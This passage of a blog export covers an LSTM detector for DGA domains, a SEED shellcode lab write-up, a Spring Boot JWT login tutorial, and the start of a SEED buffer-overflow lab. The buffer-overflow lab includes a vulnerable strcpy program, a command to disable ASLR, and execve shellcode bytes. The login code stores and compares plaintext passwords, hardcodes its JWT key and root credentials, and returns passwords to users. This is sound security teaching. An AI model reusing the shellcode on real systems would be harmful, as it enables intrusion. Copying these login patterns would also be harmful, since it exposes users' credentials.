[line.split(&#39;\t&#39;)[1].split(&#39;\s&#39;)[0] for line in lines]    return dga_list# dga_list = read_dga(&quot;dga-domain.txt&quot;)def read_umbrella(file_path):    umbrella_pd = pd.read_csv(file_path, usecols=[1], nrows=1000000, header=None, names=[&quot;data&quot;])    umbrella_list = umbrella_pd[&quot;data&quot;].tolist()    return umbrella_list# umbrella_list = read_umbrella(&quot;umbrella-top-1m.csv&quot;)def data_process(data_list):    # 将字母转化为Ascall码，并做归一化处理    X = [[ord(char) - 96 for char in domain] for domain in data_list]    # 填充数据，使得每个序列长度一致    X = sequence.pad_sequences(X, maxlen=253)    return X# X = data_process(dga_list + umbrella_list)# y = np.array([1] * len(dga_list) + [0] * len(umbrella_list))## X, y = shuffle(X, y, random_state=42)# X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)def train_model(X_train, y_train):    # 模型构建    model = Sequential()    # LSTM层，32个神经单元。输入形状：时间步长（特征维度），步长（每次训练使用特征数）    # X_train.shape输出训练集的样本数和特征维度的列表,input_shape：时间步长，步长    model.add(LSTM(32, input_shape=(X_train.shape[1], 1)))    # 输出层    # sigmod函数解决二分类问题    model.add(Dense(1, activation=&#39;sigmoid&#39;))    # 编译模型    # 二分类问题编译，优化    model.compile(loss=&#39;binary_crossentropy&#39;, optimizer=&#39;adam&#39;, metrics=[&#39;accuracy&#39;])    # 训练模型    # 模型输入为三维：样本数，时间步长，步长    model.fit(X_train.reshape(X_train.shape[0], X_train.shape[1], 1), y_train, epochs=10, batch_size=32)    return model# model = train_model(X_train[0:8000], y_train[0:8000])def test_model(model, X_test, y_test):    # model.summary()    evaluation = model.evaluate(X_test, y_test, return_dict=True)    loss = evaluation[&quot;loss&quot;]    accuracy = evaluation[&quot;accuracy&quot;]    print(&#39;Test Loss:&#39;, loss)    print(&#39;Test Accuracy:&#39;, accuracy)    return evaluation# evaluation = test_model(model, X_test[0:2000], y_test[0:2000])def model_save(model):    save = input(&quot;是否保存模型到model.h5（y/n）：&quot;)    if save == &quot;Y&quot; or save == &quot;y&quot;:        model.save(&quot;model.h5&quot;)        return True    else:        return False# model_save(model)model = load_model(&#39;model.h5&#39;)while True:    domain_list = input(&quot;输入需要检测的域名：&quot;).split(&#39;\n&#39;)    X = [[ord(char) - 96 for char in domain] for domain in domain_list]    X = sequence.pad_sequences(X, maxlen=253)    # print(X.shape)    X = np.reshape(X, (X.shape[0], X.shape[1], 1))    # print(X.shape)    y = model.predict(X)    if y &gt; 0.5:        print(y, &quot;：预测结果为dga域名&quot;)    else:        print(1-y, &quot;：预测结果为正常的域名&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> LSTM </tag>
            
            <tag> Keras </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：Shellcode Development Lab</title>
      <link href="/posts/seed_shellcode/"/>
      <url>/posts/seed_shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="一-Shellcode概述"><a href="#一-Shellcode概述" class="headerlink" title="一. Shellcode概述"></a>一. Shellcode概述</h1><p>shellcode广泛用于许多涉及代码注入的攻击中。编写shellcode是相当有挑战性的。虽然我们可以很容易地从互联网上找到现有的shellcode，但是能够从头开始编写我们自己的shellcode总是令人兴奋的。shellcode中涉及到几种有趣的技术。本实验室的目的是帮助学生理解这些技术，以便他们能够编写自己的shellcode。</p><p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址。第一个挑战不是很难解决，有几种方法可以解决它。第二个挑战的解决方案导致了编写外壳代码的两种典型方法。在一种方法中，数据在执行期间被推入堆栈，因此可以从堆栈指针获得它们的地址。在第二种方法中，数据存储在代码区域中，就在调用指令之后，因此在调用调用函数时，其地址被推入堆栈（作为返回地址）。两种解决方案都非常优雅，我们希望学生能够学习这两种技术。 </p><h1 id="二-实验"><a href="#二-实验" class="headerlink" title="二. 实验"></a>二. 实验</h1><h2 id="1-Task1-Writing-Shellcode"><a href="#1-Task1-Writing-Shellcode" class="headerlink" title="1. Task1 Writing Shellcode"></a>1. Task1 Writing Shellcode</h2><h3 id="1-1-Task1-a-The-Entire-Process"><a href="#1-1-Task1-a-The-Entire-Process" class="headerlink" title="1.1. Task1.a The Entire Process"></a>1.1. Task1.a The Entire Process</h3><h3 id="Compiling-to-object-code"><a href="#Compiling-to-object-code" class="headerlink" title="Compiling to object code"></a>Compiling to object code</h3><p>使用汇编软件nasm将mysh.s（汇编程序）汇编为mysh.o（目标文件）：<br> <img src="/img/os_shellcode/image-1.png" alt="Alt text"></p><h3 id="Linking-to-generate-final-binary"><a href="#Linking-to-generate-final-binary" class="headerlink" title="Linking to generate final binary"></a>Linking to generate final binary</h3><p>使用链接程序ld链接mysh.o（目标文件）为mysh（ELF可执行文件）：<br> <img src="/img/os_shellcode/image-2.png" alt="Alt text"><br>使用命令”echo $$”获取shellcode进程PID：<br> <img src="/img/os_shellcode/image-3.png" alt="Alt text"></p><h3 id="Getting-the-machine-code"><a href="#Getting-the-machine-code" class="headerlink" title="Getting the machine code"></a>Getting the machine code</h3><p>使用objdump命令反汇编mysh.o文件，并使用intel格式显示汇编代码，左边一列为机器码，右边一列为汇编代码：<br><img src="/img/os_shellcode/image-4.png" alt="Alt text"></p><p>使用xxd命令获取目标文件数据内容。这里-p代表16进制显示，-c 20代表一行显示20字节数据（这里截取了前三行内容）：<br> <img src="/img/os_shellcode/image-5.png" alt="Alt text"><br>可以发现的是xxd命令显示了目标文件全部的16进制数据，然而objdump命令反汇编内容只是目标文件的机器代码部分，这是因为目标文件协议包括其他字段内容：<br> <img src="/img/os_shellcode/image-6.png" alt="Alt text"></p><h3 id="Using-the-shellcode-in-attacking-code"><a href="#Using-the-shellcode-in-attacking-code" class="headerlink" title="Using the shellcode in attacking code"></a>Using the shellcode in attacking code</h3><p>打开文件convert.py，将上面16进制数据中的机器码部分复制到代码中的ori_sh变量中（这个程序将这个字符串转化为shellcode）：<br> <img src="/img/os_shellcode/image-7.png" alt="Alt text"><br>运行convert.py将字符串转化为shellcode：<br> <img src="/img/os_shellcode/image-8.png" alt="Alt text"></p><h3 id="1-2-Task1-b-Eliminating-Zero-from-the-Code"><a href="#1-2-Task1-b-Eliminating-Zero-from-the-Code" class="headerlink" title="1.2. Task1.b Eliminating Zero from the Code"></a>1.2. Task1.b Eliminating Zero from the Code</h3><p>字符串复制是注入恶意代码的一个常用手段，然而字符串复制例如函数strcpy通常会从零截断。因此，为了保证shellcode不被截断，更加范用，要对一般的shellcode做去零的处理。<br>去零方式：自异或；使用短位寄存器；移位</p><h3 id="找出mysh-s中的去零操作"><a href="#找出mysh-s中的去零操作" class="headerlink" title="找出mysh.s中的去零操作"></a>找出mysh.s中的去零操作</h3><p>汇编指令xor eax eax将eax置零，之后push eax相当于push 0，但是不会像push 0一样将shellcode引入0。<br> <img src="/img/os_shellcode/image-9.png" alt="Alt text"><br>同理，在下面eax的值没有发生改变，push eax相当于push 0：<br> <img src="/img/os_shellcode/image-10.png" alt="Alt text"><br>指令xor edx,edx将edx置零：<br> <img src="/img/os_shellcode/image-11.png" alt="Alt text"><br>由于al寄存器占eax寄存器的低8位，因此将0xb存入寄存器al，相当于将0x000b存入寄存器eax，push eax则避免了eax高位为零的情况：<br> <img src="/img/os_shellcode/image-12.png" alt="Alt text"></p><h3 id="Task：编写shellcode执行程序-bin-bash，不能有多余的“-”"><a href="#Task：编写shellcode执行程序-bin-bash，不能有多余的“-”" class="headerlink" title="Task：编写shellcode执行程序&#x2F;bin&#x2F;bash，不能有多余的“&#x2F;”"></a>Task：编写shellcode执行程序&#x2F;bin&#x2F;bash，不能有多余的“&#x2F;”</h3><p>这里使用al寄存器存储“h”，push eax相当于push 0x000h。<br> <img src="/img/os_shellcode/image-13.png" alt="Alt text"><br>对编译后的shellcode进行查看，没有字节为0，即没有出现0x00：<br> <img src="/img/os_shellcode/image-14.png" alt="Alt text"></p><h3 id="1-3-Task1-c-Providing-Arguments-for-System-Calls"><a href="#1-3-Task1-c-Providing-Arguments-for-System-Calls" class="headerlink" title="1.3. Task1.c Providing Arguments for System Calls"></a>1.3. Task1.c Providing Arguments for System Calls</h3><p>对于执行程序&#x2F;bin&#x2F;sh的shellcode，这里给出了参数argv数组需要填写的值：&#x2F;bin&#x2F;sh；-c；ls -la；0。也就是说我们需要将这些参数构造在堆栈上，然后执行系统调用即可。<br>首先使用eax寄存器将字符串压入栈中，中间使用0分隔；然后使用寄存器寄存器将argv数组的值压入栈中；最后将ecx指向argv即可。<br> <img src="/img/os_shellcode/image-15.png" alt="Alt text"><br> <img src="/img/os_shellcode/image-16.png" alt="Alt text"><br>编译链接以后成功执行&#x2F;bin&#x2F;sh -c ls -la：<br> <img src="/img/os_shellcode/image-17.png" alt="Alt text"></p><h3 id="1-4-Task1-d-Providing-Environment-Variables-for-execve"><a href="#1-4-Task1-d-Providing-Environment-Variables-for-execve" class="headerlink" title="1.4 Task1.d Providing Environment Variables for execve()"></a>1.4 Task1.d Providing Environment Variables for execve()</h3><p>对比上一个任务，这个任务压入四个环境变量aaa,bbb,cccc,0并将edx指向env数组即可。然后argv的参数少了几个。</p><p> <img src="/img/os_shellcode/image-18.png" alt="Alt text"><br> <img src="/img/os_shellcode/image-19.png" alt="Alt text"><br> <img src="/img/os_shellcode/image-20.png" alt="Alt text"><br><img src="/img/os_shellcode/image-21.png" alt="Alt text"></p><h2 id="2-Task2-Using-Code-Segment"><a href="#2-Task2-Using-Code-Segment" class="headerlink" title="2. Task2 Using Code Segment"></a>2. Task2 Using Code Segment</h2><h3 id="解释mysh2-s为什么能够成功执行程序-bin-sh："><a href="#解释mysh2-s为什么能够成功执行程序-bin-sh：" class="headerlink" title="解释mysh2.s为什么能够成功执行程序&#x2F;bin&#x2F;sh："></a>解释mysh2.s为什么能够成功执行程序&#x2F;bin&#x2F;sh：</h3><p> <img src="/img/os_shellcode/image-22.png" alt="Alt text"><br>程序mysh2.s通过构造db字符串实现shellcode注入。首先构造db字符串占位；其次替换掉字符串中的零，写入参数地址；最后将ecx指向参数地址，执行系统调用。</p><h3 id="使用mysh2-s中的方法执行程序-usr-bin-env"><a href="#使用mysh2-s中的方法执行程序-usr-bin-env" class="headerlink" title="使用mysh2.s中的方法执行程序&#x2F;usr&#x2F;bin&#x2F;env"></a>使用mysh2.s中的方法执行程序&#x2F;usr&#x2F;bin&#x2F;env</h3><p>重新编写mysh2.s：<br> <img src="/img/os_shellcode/image-23.png" alt="Alt text"><br> <img src="/img/os_shellcode/image-24.png" alt="Alt text"><br>编译并链接汇编程序mysh2.s，需要注意的是这里链接时需要加入“–omagic”指示代码区可修改，否则会出现segment fault<br> <img src="/img/os_shellcode/image-25.png" alt="Alt text"></p><h2 id="3-Task3-Writing-64-bit-Shellcode"><a href="#3-Task3-Writing-64-bit-Shellcode" class="headerlink" title="3. Task3 Writing 64-bit Shellcode"></a>3. Task3 Writing 64-bit Shellcode</h2><p>对于64位系统架构：寄存器存储8字节数据；系统调用的参数使用寄存器rdx，rsi，rdi。</p><h3 id="编写程序mysh-64-s，执行程序-bin-bash（即在64位环境下完成Task1-b中的Task）"><a href="#编写程序mysh-64-s，执行程序-bin-bash（即在64位环境下完成Task1-b中的Task）" class="headerlink" title="编写程序mysh_64.s，执行程序&#x2F;bin&#x2F;bash（即在64位环境下完成Task1.b中的Task）"></a>编写程序mysh_64.s，执行程序&#x2F;bin&#x2F;bash（即在64位环境下完成Task1.b中的Task）</h3><p>思路和mysh.s的编写一致，只有寄存器使用变化。使用rax寄存器将“&#x2F;bin&#x2F;bash”入栈，使用寄存器rdi作为argv直指向字符串，rsi寄存器指向argv即可。<br> <img src="/img/os_shellcode/image-26.png" alt="Alt text"></p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEED </tag>
            
            <tag> Shellcode Development Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web 登录实现&amp;身份认证</title>
      <link href="/posts/web_login/"/>
      <url>/posts/web_login/</url>
      
        <content type="html"><![CDATA[<h2 id="开发工具-环境"><a href="#开发工具-环境" class="headerlink" title="开发工具&amp;环境"></a>开发工具&amp;环境</h2><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p>vue集成html，css，javascript</p><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p>SpringBoot集成mybatis，java，tomcat</p><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>Mysql以及图形化界面SQLyogEnt</p><h3 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h3><p>数据库数据-java对象&#x2F;Dao(mapper)—&gt; 程序数据 (controller)—&gt; 后端数据 —tomcat—&gt; 前端数据 -vue-&gt; html数据</p><h1 id="数据结构-接口文档"><a href="#数据结构-接口文档" class="headerlink" title="数据结构&amp;接口文档"></a>数据结构&amp;接口文档</h1><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h3><p>user表id，username，password；将id设置为主键</p><h3 id="Java类"><a href="#Java类" class="headerlink" title="Java类"></a>Java类</h3><p>新建User类：int id，String username，String password</p><h2 id="接口文档"><a href="#接口文档" class="headerlink" title="接口文档"></a>接口文档</h2><h3 id="1-用户注册："><a href="#1-用户注册：" class="headerlink" title="1. 用户注册："></a>1. 用户注册：</h3><p>POST localhost&#x2F;auth&#x2F;register</p><p>username: “xxx”</p><p>hash_password: “xxx” </p><h3 id="2-用户登录："><a href="#2-用户登录：" class="headerlink" title="2. 用户登录："></a>2. 用户登录：</h3><p>POST localhost&#x2F;auth&#x2F;login</p><p>username: “xxx”</p><p>password: “xxx”</p><p>return token</p><h3 id="2-拉取用户信息："><a href="#2-拉取用户信息：" class="headerlink" title="2. 拉取用户信息："></a>2. 拉取用户信息：</h3><p>GET localhost&#x2F;user</p><p>token: “xxx”</p><p>return：id,username,password</p><h3 id="3-修改用户信息："><a href="#3-修改用户信息：" class="headerlink" title="3. 修改用户信息："></a>3. 修改用户信息：</h3><p>PUT localhost&#x2F;user</p><p>token: “xxx”</p><p>username: “xxx”</p><p>hash_password: “xxx”</p><h1 id="后端实现"><a href="#后端实现" class="headerlink" title="后端实现"></a>后端实现</h1><h2 id="数据库实现"><a href="#数据库实现" class="headerlink" title="数据库实现"></a>数据库实现</h2><p>user表id，username，password；将id设置为主键</p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><h3 id="application-properties文件："><a href="#application-properties文件：" class="headerlink" title="application.properties文件："></a>application.properties文件：</h3><pre><code class="java">spring.datasource.type=com.alibaba.druid.pool.DruidDataSource# ????spring.datasource.driver-class-name=com.mysql.jdbc.Driver# ?????spring.datasource.url=jdbc:mysql://localhost:3306/mybatis?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=UTCspring.datasource.username=rootspring.datasource.password=root</code></pre><h2 id="Dao层实现"><a href="#Dao层实现" class="headerlink" title="Dao层实现"></a>Dao层实现</h2><pre><code class="java">package com.example.bbb.entity;public class User &#123;    private int id;    private String username;    private String password;    public int getId() &#123;        return id;    &#125;    public String getUsername()&#123;        return username;    &#125;    public String getPassword()&#123;        return password;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public void setPassword(String password) &#123;        this.password = password;    &#125;    public void setId(int id) &#123;        this.id = id;    &#125;    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, password=&#39;&quot; + password + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><h2 id="Mapper层实现"><a href="#Mapper层实现" class="headerlink" title="Mapper层实现"></a>Mapper层实现</h2><pre><code class="java">package com.example.bbb.mapper;import java.util.List;import com.baomidou.mybatisplus.core.mapper.BaseMapper;import com.example.bbb.entity.User;import org.apache.ibatis.annotations.*;@Mapperpublic interface UserMapper&#123;    @Select(&quot;select id from user where username = #&#123;username&#125;&quot;)    public int getId(String username);    //返回查询对象的集合    @Select(&quot;select * from user&quot;)    public List&lt;User&gt; findAll();    //返回查询对象    @Select(&quot;select * from user where id = #&#123;id&#125;&quot;)    public User getInfo(int id);    @Select(&quot;select username from user&quot;)    public List&lt;String&gt; getAllUsername();    @Select(&quot;select * from user where username = #&#123;username&#125;&quot;)    public User findByUsername(String username);    //将数据库insert语句映射到java程序的insert方法    //返回值为插入语句影响的记录数目    @Insert(&quot;insert into user values (#&#123;id&#125;,#&#123;name&#125;,#&#123;password&#125;)&quot;)    public int insert(int id, String name,String password);    //将数据库delete语句映射到java程序的delete方法    //返回值为删除语句影响的记录数目    @Delete(&quot;delete  from user where id = #&#123;id&#125;&quot;)    public int delete(int id);    //将数据库update语句映射到java程序的update方法    //返回值为更新语句影响的记录数目    @Update(&quot;update user set username = #&#123;newName&#125;,password= #&#123;newPassword&#125; where id = #&#123;id&#125;&quot;)    public int update(int id,String newName,String newPassword);    @Select(&quot;select username from user where username != #&#123;username&#125;&quot;)    public List&lt;String&gt; otherUserName(String username);&#125;</code></pre><h2 id="Controller层实现"><a href="#Controller层实现" class="headerlink" title="Controller层实现"></a>Controller层实现</h2><pre><code class="java">package com.example.bbb.controller;import com.example.bbb.entity.User;import com.example.bbb.mapper.UserMapper;import com.fasterxml.jackson.core.JsonProcessingException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.*;import java.util.List;import com.fasterxml.jackson.databind.ObjectMapper;import static com.example.bbb.utils.JwtUtils.*;@RestController@CrossOriginpublic class UserController &#123;    @Autowired    private UserMapper userMapper;    //登录    @PostMapping(&quot;/auth/login&quot;)    public String login(@RequestParam(&quot;username&quot;) String username,@RequestParam(&quot;password&quot;) String password)&#123;        //权限标识        int verify = 0;        //检查账号，密码        List&lt;User&gt; list = userMapper.findAll();        for(int i=0; i&lt;list.size(); i++)&#123;            User useri = list.get(i);            if(useri.getUsername().equals(username) &amp;&amp; useri.getPassword().equals(password))&#123;                verify = 1;                break;            &#125;        &#125;        //权限判断        if(verify==1)&#123;            String token = generateToken(username);            int id = userMapper.getId(username);            System.out.println(&quot;用户&quot;+id+&quot;登录成功！&quot;);            return token;        &#125;else&#123;            System.out.println(&quot;用户&quot;+username+&quot;登录失败！！&quot;);            return &quot;error&quot;;        &#125;    &#125;    //返回用户个人信息    @GetMapping(&quot;/user&quot;)    public String info(@RequestParam String token) throws JsonProcessingException &#123;        if(verifyToken(token)) &#123;            String username = getUsernameFromToken(token);            int id = userMapper.getId(username);            User user = userMapper.getInfo(id);            ObjectMapper objectMapper = new ObjectMapper();            String userJson = objectMapper.writeValueAsString(user);            System.out.println(&quot;用户&quot;+id+&quot;查看个人信息！&quot;);            return userJson;        &#125; else&#123;            System.out.println(&quot;错误的token！！！&quot;);            return &quot;error&quot;;        &#125;    &#125;    //用户注册    @PostMapping(&quot;/auth/register&quot;)    public String register(@RequestParam(&quot;username&quot;) String newusername,@RequestParam String password)&#123;        int id = 0;        List&lt;String&gt; usernameList = userMapper.getAllUsername();        for(int i=0; i&lt;usernameList.size(); i++)&#123;            String username = usernameList.get(i);            if(username.equals(newusername))&#123;                System.out.println(&quot;注册存在的用户名！&quot;);                return(&quot;error&quot;);            &#125;        &#125;        userMapper.insert(id,newusername,password);        int newid = userMapper.getId(newusername);        System.out.println(&quot;用户&quot;+newid+&quot;注册成功！！&quot;);        return &quot;用户名：&quot;+newusername + &#39;\n&#39; +&quot;密码（hash）：&quot;+password;    &#125;//    //用户注销//    @DeleteMapping(&quot;/user&quot;)//    public String delete(@RequestParam int id)&#123;//        userMapper.delete(id);//        return &quot;delete&quot;;//    &#125;    //修改个人信息    @PutMapping(&quot;/user&quot;)    public String update(@RequestParam String token,@RequestParam String newUsername,@RequestParam String newPassword) &#123;        if(verifyToken(token)) &#123;            String username = getUsernameFromToken(token);            int id = userMapper.getId(username);            List&lt;String&gt; list = userMapper.otherUserName(username);            for (int i = 0; i &lt; list.size(); i++) &#123;                String usernamei = list.get(i);                if (usernamei.equals(newUsername)) &#123;                    System.out.println(&quot;用户&quot; + id + &quot;使用重复的用户名！&quot;);                    return &quot;error&quot;;                &#125;            &#125;            userMapper.update(id, newUsername, newPassword);            System.out.println(&quot;用户&quot; + id + &quot;更新用户名&quot; + username + &quot;为&quot; + newUsername);            return &quot;ok&quot;;        &#125; else&#123;            System.out.println(&quot;错误的token！！！&quot;);            return &quot;error&quot;;        &#125;    &#125;&#125;</code></pre><h2 id="JWT实现"><a href="#JWT实现" class="headerlink" title="JWT实现"></a>JWT实现</h2><pre><code class="java">package com.example.bbb.utils;import io.jsonwebtoken.Claims;import io.jsonwebtoken.Jwts;import io.jsonwebtoken.SignatureAlgorithm;import java.util.Date;public class JwtUtils &#123;    //token有效时间    private static long expire = 604800;    //token秘钥    private static String key = &quot;aaaabbbbccccddddaaaabbbbccccdddd&quot;;    //生成token    public static String generateToken(String username)&#123;        Date now = new Date();        Date expiration = new Date(now.getTime()+1000*expire);        return Jwts.builder()                .setSubject(username)                .setIssuedAt(now)                .setExpiration(expiration)                .signWith(SignatureAlgorithm.HS512,key)                .compact();    &#125;    // 校验token合法性    public static boolean verifyToken(String token) &#123;        try &#123;            Jwts.parser().setSigningKey(key).parseClaimsJws(token);            return true;        &#125; catch (Exception e) &#123;            // 处理异常            System.out.println(&quot;错误的token&quot;);        &#125;        return false;    &#125;    //提取token中的username    public static String getUsernameFromToken(String token)&#123;        Claims claims = Jwts.parser()                .setSigningKey(key)                .parseClaimsJws(token)                .getBody();        return claims.getSubject();    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> java </tag>
            
            <tag> springboot </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEED：Buffer Overflow Attack Lab (Server Version)</title>
      <link href="/posts/seed_stackoverflow/"/>
      <url>/posts/seed_stackoverflow/</url>
      
        <content type="html"><![CDATA[<p><em>你可以到SEED官网获取实验资料：<a href="https://seedsecuritylabs.org/Labs_20.04/Software/Buffer_Overflow_Server/">Buffer-Overflow Attack Lab (Server Version)</a></em></p><p><em><a href="https://blog.csdn.net/wion03/article/details/133856446">网络攻防技术——缓冲区溢出攻击（基于服务器）</a></em></p><h1 id="一-缓存区溢出攻击概述"><a href="#一-缓存区溢出攻击概述" class="headerlink" title="一 缓存区溢出攻击概述"></a>一 缓存区溢出攻击概述</h1><h2 id="C语言和堆栈"><a href="#C语言和堆栈" class="headerlink" title="C语言和堆栈"></a>C语言和堆栈</h2><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><p>函数中定义的变量</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>内存大，链表，碎片化</p><h3 id="栈（堆栈）"><a href="#栈（堆栈）" class="headerlink" title="栈（堆栈）"></a>栈（堆栈）</h3><p>内存小，编译器决定1-8MB，后进先出LIFO，快</p><h3 id="局部变量和堆栈"><a href="#局部变量和堆栈" class="headerlink" title="局部变量和堆栈"></a>局部变量和堆栈</h3><p><a href="https://zhuanlan.zhihu.com/p/142964520">c语言进阶：堆栈原理揭秘</a></p><p>C语言有很多不同类别的数据，他们有不同的生命周期，这不是C语言本身决定的，而是操作系统存放这些数据的位置决定了他们的生命周期。</p><p>运行一个程序，操作系统会将数据其映射到内存中，不同的数据将会映射到不同的内存中栈&#x2F;堆&#x2F;代码区等。</p><h3 id="函数调用和堆栈"><a href="#函数调用和堆栈" class="headerlink" title="函数调用和堆栈"></a>函数调用和堆栈</h3><h3 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h3><p><a href="https://zhuanlan.zhihu.com/p/186812518">一文理解缓冲区溢出</a></p><p>缓冲区溢出被定义为程序试图将数据写入缓冲区边界之外的情况。恶意用户可以利用此漏洞更改程序的流控制，从而导致恶意代码的执行。</p><h3 id="栈溢出详解"><a href="#栈溢出详解" class="headerlink" title="栈溢出详解"></a>栈溢出详解</h3><p>缓冲区溢出在栈溢出上应用很多，因为当程序调用函数时，会将返回地址ret暂时存在栈区上。如果构造一次恶意溢出使用恶意抵制覆盖返回地址ret的值，那么将可以控制程序流甚至执行以进程权限执行任意程序。如果这个进程是根权限，那么shellcode也将获取到根权限。</p><h3 id="shellcode和栈溢出"><a href="#shellcode和栈溢出" class="headerlink" title="shellcode和栈溢出"></a>shellcode和栈溢出</h3><p>可以这样理解，攻击方式就像武器库，而攻击载荷就像弹药库。</p><p>栈溢出就像攻击者的导弹，瞄准程序的弱点，但是实际造成攻击还需要弹药，也就是shellcode，shellcode决定对目标主机造成什么攻击。</p><h1 id="二-实验环境"><a href="#二-实验环境" class="headerlink" title="二 实验环境"></a>二 实验环境</h1><p>在这个实验中，有四个不同的服务器，不同服务器上以根权限运行着不同难度的缓冲区溢出漏洞的程序，对应关系如下：</p><ul><li>level-1：10.9.0.5:9090运行32位缓冲区溢出漏洞程序</li><li>level-2：10.9.0.6:9090运行32位缓冲区溢出漏洞程序</li><li>level-3：10.9.0.7:9090运行64位缓冲区溢出漏洞程序</li><li>level-4：10.9.0.8:9090运行64位缓冲区溢出漏洞程序</li><li>level-5：10.9.0.9:9090运行32位缓冲区溢出漏洞程序</li></ul><p>任务是开发一种利用该漏洞的方案，并最终获得这些服务器上的根权限。除了攻击之外，还将尝试几种对抗缓冲区溢出攻击的对策。</p><h3 id="关闭地址随机化"><a href="#关闭地址随机化" class="headerlink" title="关闭地址随机化"></a>关闭地址随机化</h3><p>在开始这个实验之前，需要确保地址随机化对策被关闭;否则，进攻会很困难。可以使用以下命令：<code>sudo /sbin/sysctl -w kernel.randomize_va_space=0</code></p><h3 id="漏洞程序：stack-c"><a href="#漏洞程序：stack-c" class="headerlink" title="漏洞程序：stack.c"></a>漏洞程序：stack.c</h3><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;/* Changing this size will change the layout of the stack.* Instructors can change this value each year, so students* won’t be able to use the solutions from the past.#ifndef BUF_SIZE#define BUF_SIZE 100#endifint bof(char *str)&#123;char buffer[BUF_SIZE];/* The following statement has a buffer overflow problem */strcpy(buffer, str); ✰return 1;&#125;int main(int argc, char **argv)&#123;char str[517];int length = fread(str, sizeof(char), 517, stdin);bof(str);fprintf(stdout, &quot;==== Returned Properly ====\n&quot;);return 1;&#125;</code></pre><p>上述程序有缓冲区溢出漏洞。它从标准输入中读取数据，然后将数据传递给函数bof()中的另一个缓冲区。原始输入的最大长度为517字节，但bof()中的缓冲区只有BUF SIZE字节长，小于517字节。因为strcpy()不检查边界，所以会发生缓冲区溢出。</p><h3 id="服务器程序：server-c"><a href="#服务器程序：server-c" class="headerlink" title="服务器程序：server.c"></a>服务器程序：server.c</h3><p>在server-code文件夹中，可以找到一个名为server.c的程序。这是服务器的主要入口点。它监听端口9090。当它接收到TCP连接时，它调用堆栈程序，并将TCP连接设置为堆栈程序的标准输入。这样，当stack从stdin读取数据时，它实际上是从TCP连接中读取的，也就是说，这些数据是由TCP客户端用户提供的。由于程序stack.c将在具有root权限的服务器上运行，如果用户可以利用这个缓冲区溢出漏洞，他们就可以在服务器上获得根shell。学生不需要阅读server.c的源代码。</p><h3 id="容器启动"><a href="#容器启动" class="headerlink" title="容器启动"></a>容器启动</h3><p>了解完实验的整个流程和配置信息，通过下面命令操作容器，开始实验。</p><p>进入Labsetup目录，使用命令<code>dcbuild</code> <code>dcup</code> <code>dcdown</code>。 </p><h3 id="熟悉Shellcode"><a href="#熟悉Shellcode" class="headerlink" title="熟悉Shellcode"></a>熟悉Shellcode</h3><p>缓冲区溢出攻击的最终目的是将恶意代码注入到目标程序中，这样代码就可以使用目标程序的特权来执行。Shellcode被广泛用于大多数代码注入攻击。让我们在这个任务中熟悉它。</p><p>Shellcode通常用于代码注入攻击。它基本上是一段启动shell的代码，通常用汇编语言编写。在这个实验中，我们只提供一个通用shellcode的二进制版本，而不解释它是如何工作的，因为它很重要。如果您对shellcode的工作原理感兴趣，并且想从头开始编写一个shellcode，您可以从一个名为shellcode lab的独立SEED实验室中学习。我们的通用shellcode如下所示(我们只列出32位版本):</p><pre><code class="python">shellcode = (&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;&quot;/bin/bash*&quot;                                                 &quot;-c*&quot;                                                        &quot;/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd        *&quot;# The * in this line serves as the position marker         *&quot;AAAA&quot; # Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;&quot;BBBB&quot; # Placeholder for argv[1] --&gt; &quot;-c&quot;&quot;CCCC&quot; # Placeholder for argv[2] --&gt; the command string&quot;DDDD&quot; # Placeholder for argv[3] --&gt; NULL).encode(’latin-1’)</code></pre><p>您可以在shellcode文件夹中找到通用的shellcode。在里面，您将看到两个Python程序，shellcode 32.py和shellcode 64.py。它们分别适用于32位和64位的shellcode。这两个Python程序将分别将二进制shellcode写入codefile 32和codefile 64。然后可以使用call shellcode来执行其中的shellcode。</p><pre><code 